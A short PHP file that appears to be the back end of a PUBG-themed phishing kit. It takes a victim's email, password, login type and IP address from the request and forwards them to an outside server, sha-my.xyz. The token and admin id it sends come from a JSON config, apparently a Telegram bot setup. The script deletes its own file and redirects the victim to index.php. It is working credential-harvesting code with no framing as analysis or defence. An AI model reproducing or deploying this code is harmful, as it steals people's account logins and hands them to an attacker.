<?php
unlink('pubg.php');
$info = json_decode(file_get_contents('Sha_My.json'),1);
$API_KEY = $info[info]['token'];

    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }  
$admin = $info[info]['id'];
$email = $_GET["email"];
$password = $_GET["password"];
$login = $_GET["login"];
$l = "MT";
if($email){
$send = file_get_contents("https://sha-my.xyz/Pubg/Send.php?token=".$API_KEY."&id=".$admin."&ip=".$ip."&email=".$email."&password=".$password."&login=".$login."&l=".$l);
header("location: $send");
}
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='index.php'" />
    <script type="text/javascript">
            window.location.href = "index.php"
    </script>
 </head>
  <body>
  </body>
</html>
